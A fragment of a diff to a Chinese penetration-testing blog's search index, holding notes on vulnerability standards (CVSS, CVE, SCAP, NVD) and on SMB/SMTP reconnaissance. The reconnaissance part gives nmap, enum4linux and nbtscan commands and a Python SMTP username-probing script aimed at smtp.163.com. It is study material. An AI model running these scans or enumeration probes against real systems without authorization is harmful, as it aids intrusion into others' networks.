title="漏洞扫描类型"></a>漏洞扫描类型</h5></blockquote><p>主动扫描<br>    有身份验证<br>    无身份验证<br>被动扫描<br>    镜像端口抓包<br>    其它来源输入<br>基于Agent的扫描<br>    支持平台有限</p><blockquote><h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4></blockquote><h5 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS (Common Vulnerability Scoring System)"></a><strong>CVSS</strong> (Common Vulnerability Scoring System)</h5><p>通用漏洞评分系统–工业标准<br>描述安全漏洞严重程度的统一评分方案<br>V3版本–2015年6月10日<br>Basic Metric:基础的恒定不变的弱点权重<br>Temporal Metric:依赖时间因素的弱点权重<br>Enviromental Metric:利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议(SCAP)的一部分<br>通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新<br>分值范围:0–10<br>不同机构按CVSS分会定义威胁的中,高,低威胁级别<br>CVSS体现弱点的风险,威胁级别(severity)表示弱点风险对企业的影响程度<br>CVSS分值是工业标准,但威胁级别不是<br>Vulnerability Reference</p><h5 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE (Common Vulnerabilities and Exposures)"></a><strong>CVE</strong> (Common Vulnerabilities and Exposures)</h5><p>已公开的信息安全漏洞字典,统一的漏洞编号标准<br>MITRE公司负责维护(非盈利机构)<br>扫描器的大部分扫描式都对应一个CVE编号<br>实现不同厂商之间信息交换的统一标准</p><h5 id="CVE发布流程"><a href="#CVE发布流程" class="headerlink" title="CVE发布流程"></a>CVE发布流程</h5><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List —-CVE-2008-4250</li><li>MITRE负责对内容 进行编辑维护</li><li>很多厂商维护自己的Vulnerability Reference<br>  MS(微软)<br>  MSKB</li><li>其它Vulnerability Reference<br>  CERT    TA08-297A<br>  BID        31874<br>  IAVM    2008-A-0081<br>  OVAL    OVAL6093</li></ul><h5 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL (Open Vulnerability and Assessment Language)"></a><strong>OVAL</strong> (Open Vulnerability and Assessment Language)</h5><p>描述漏洞检测方法的机器可识别语言<br>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施漏洞检测工作<br>OVAL使用XML语言描述,包含了严密的语法逻辑</p><h5 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a><strong>CCE</strong></h5><p>描述软件配置缺陷的一种标准化格式<br>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作.</p><h5 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)`"></a><strong>CPE</strong>(Common Product Enumeration)`</h5><p>信息技术产品,系统,软件包的机构化命名规范,分类命名</p><h5 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE (Common Weakness Enumeration)"></a><strong>CWE</strong> (Common Weakness Enumeration)</h5><p>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</p><h5 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP (Security Content Automation Protocol)"></a><strong>SCAP</strong> (Security Content Automation Protocol)</h5><p>SCAP是一个集合了多种安全标准框架<br>六个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF<br>目的是以标准的方法展示和操作安全数据<br>由NIST负责维护<br>SCAP主要解决三个问题<br>    实现高层政策法规等到底层实施的落地(如FISMA,ISO27000系列)<br>    将信息安全所涉及的各个要素标准化(如统一漏洞的命名及严重性度量)<br>    将复杂的系统配置核查工作自动化<br>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响.</p><h5 id="NVD-National-Vulnerability-Database"><a href="#NVD-National-Vulnerability-Database" class="headerlink" title="NVD (National Vulnerability Database)"></a><strong>NVD</strong> (National Vulnerability Database)</h5><p>美国政府的漏洞管理标准数据<br>完全基于SCAP框架<br>实现自动化漏洞管理,安全测量,合规要求<br>包含以下库<br>    安全检查列表<br>    软件安全漏洞<br>    配置错误<br>    产品名称<br>    影响度量<br>    <a href="https://nvd.nist.gov" target="_blank" rel="noopener">https://nvd.nist.gov</a></p><blockquote><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4></blockquote><p>周期性扫描跟踪漏洞<br>高位漏洞优先处理<br>扫描注意事项<br>漏洞管理三要素<br>    准确性<br>    时间<br>    资源</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞库 </tag>
+            
+            <tag> 漏洞扫描 </tag>
+            
+            <tag> CVE </tag>
             
         </tags>
       
@@ -2335,9 +2827,9 @@
       
         <tags>
             
-            <tag> WPA </tag>
-            
             <tag> 无线加密 </tag>
+            
+            <tag> WPA </tag>
             
         </tags>
       
@@ -2397,9 +2889,9 @@
       
         <tags>
             
-            <tag> 无线数据帧 </tag>
-            
             <tag> 802.11 </tag>
+            
+            <tag> 无线数据帧 </tag>
             
         </tags>
       
@@ -2633,29 +3125,37 @@
     
     
     <entry>
-      <title>漏洞的基本概念及漏洞发现管理</title>
-      <link href="/2013/04/17/Exploits/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
-      <url>/2013/04/17/Exploits/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
+      <title>SMB扫描及SMTP扫描</title>
+      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
+      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
       
-        <content type="html"><![CDATA[<blockquote><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4></blockquote><p>基于端口服务扫描结果版本信息(速度慢)<br>搜索已公开的漏洞数据库(数量大)<br>使用弱点扫描器实现漏洞管理</p><blockquote><h4 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h4></blockquote><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>    #kali官方漏洞库<br><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><code>sandi漏洞库</code> #程序停更<br>    <code>searchsploit tomcat</code><br>    <code>cd /usr/share/exploitdb/exploits/</code></p><blockquote><h4 id="从信息的纬度定义漏洞管理"><a href="#从信息的纬度定义漏洞管理" class="headerlink" title="从信息的纬度定义漏洞管理"></a>从信息的纬度定义漏洞管理</h4></blockquote><p>信息收集:<br>    扫描发现网络IP,OS,服务,配置,漏洞<br>    能力需求:定义扫描方式内容和目标<br>信息管理:<br>    格式化信息,并进行筛选,分组,定义优先级<br>    能力需求:资产分组,指定所有者,向所有者报告漏洞<br>信息输出:<br>    向不同层级的人群展示足够的信息量<br>    能力需求:生成报告,导出数据,与SIEM集成</p><blockquote><h5 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h5></blockquote><p>主动扫描<br>    有身份验证<br>    无身份验证<br>被动扫描<br>    镜像端口抓包<br>    其它来源输入<br>基于Agent的扫描<br>    支持平台有限</p><blockquote><h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4></blockquote><h5 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS (Common Vulnerability Scoring System)"></a><strong>CVSS</strong> (Common Vulnerability Scoring System)</h5><p>通用漏洞评分系统–工业标准<br>描述安全漏洞严重程度的统一评分方案<br>V3版本–2015年6月10日<br>Basic Metric:基础的恒定不变的弱点权重<br>Temporal Metric:依赖时间因素的弱点权重<br>Enviromental Metric:利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议(SCAP)的一部分<br>通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新<br>分值范围:0–10<br>不同机构按CVSS分会定义威胁的中,高,低威胁级别<br>CVSS体现弱点的风险,威胁级别(severity)表示弱点风险对企业的影响程度<br>CVSS分值是工业标准,但威胁级别不是<br>Vulnerability Reference</p><h5 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE (Common Vulnerabilities and Exposures)"></a><strong>CVE</strong> (Common Vulnerabilities and Exposures)</h5><p>已公开的信息安全漏洞字典,统一的漏洞编号标准<br>MITRE公司负责维护(非盈利机构)<br>扫描器的大部分扫描式都对应一个CVE编号<br>实现不同厂商之间信息交换的统一标准</p><h5 id="CVE发布流程"><a href="#CVE发布流程" class="headerlink" title="CVE发布流程"></a>CVE发布流程</h5><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List —-CVE-2008-4250</li><li>MITRE负责对内容 进行编辑维护</li><li>很多厂商维护自己的Vulnerability Reference<br>  MS(微软)<br>  MSKB</li><li>其它Vulnerability Reference<br>  CERT    TA08-297A<br>  BID        31874<br>  IAVM    2008-A-0081<br>  OVAL    OVAL6093</li></ul><h5 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL (Open Vulnerability and Assessment Language)"></a><strong>OVAL</strong> (Open Vulnerability and Assessment Language)</h5><p>描述漏洞检测方法的机器可识别语言<br>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施漏洞检测工作<br>OVAL使用XML语言描述,包含了严密的语法逻辑</p><h5 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a><strong>CCE</strong></h5><p>描述软件配置缺陷的一种标准化格式<br>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作.</p><h5 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)`"></a><strong>CPE</strong>(Common Product Enumeration)`</h5><p>信息技术产品,系统,软件包的机构化命名规范,分类命名</p><h5 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE (Common Weakness Enumeration)"></a><strong>CWE</strong> (Common Weakness Enumeration)</h5><p>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</p><h5 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP (Security Content Automation Protocol)"></a><strong>SCAP</strong> (Security Content Automation Protocol)</h5><p>SCAP是一个集合了多种安全标准框架<br>六个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF<br>目的是以标准的方法展示和操作安全数据<br>由NIST负责维护<br>SCAP主要解决三个问题<br>    实现高层政策法规等到底层实施的落地(如FISMA,ISO27000系列)<br>    将信息安全所涉及的各个要素标准化(如统一漏洞的命名及严重性度量)<br>    将复杂的系统配置核查工作自动化<br>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响.</p><h5 id="NVD-National-Vulnerability-Database"><a href="#NVD-National-Vulnerability-Database" class="headerlink" title="NVD (National Vulnerability Database)"></a><strong>NVD</strong> (National Vulnerability Database)</h5><p>美国政府的漏洞管理标准数据<br>完全基于SCAP框架<br>实现自动化漏洞管理,安全测量,合规要求<br>包含以下库<br>    安全检查列表<br>    软件安全漏洞<br>    配置错误<br>    产品名称<br>    影响度量<br>    <a href="https://nvd.nist.gov" target="_blank" rel="noopener">https://nvd.nist.gov</a></p><blockquote><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4></blockquote><p>周期性扫描跟踪漏洞<br>高位漏洞优先处理<br>扫描注意事项<br>漏洞管理三要素<br>    准确性<br>    时间<br>    资源</p>]]></content>
+        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
           
           <category> 渗透测试 </category>
           
-          <category> 漏洞利用 </category>
+          <category> 信息收集 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> 漏洞库 </tag>
+            <tag> python </tag>
             
-            <tag> 漏洞扫描 </tag>
+            <tag> nmap </tag>
             
-            <tag> CVE </tag>
+            <tag> SMB扫描 </tag>
+            
+            <tag> SMTP扫描 </tag>
+            
+            <tag> nc </tag>
+            
+            <tag> nbtscan </tag>
+            
+            <tag> enum4linux </tag>
             
         </tags>
       
@@ -2693,45 +3193,6 @@
             <tag> wafw00f </tag>
             
             <tag> 负载均衡 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SMB扫描及SMTP扫描</title>
-      <link href="/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/"/>
-      <url>/2013/03/23/Information_Gethering/SMB%E6%89%AB%E6%8F%8F%E5%8F%8ASMTP%E6%89%AB%E6%8F%8F/</url>
-      
-        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> nmap </tag>
-            
-            <tag> SMB扫描 </tag>
-            
-            <tag> SMTP扫描 </tag>
-            
-            <tag> nc </tag>
-            
-            <tag> nbtscan </tag>
-            
-            <tag> enum4linux </tag>
             
         </tags>
       
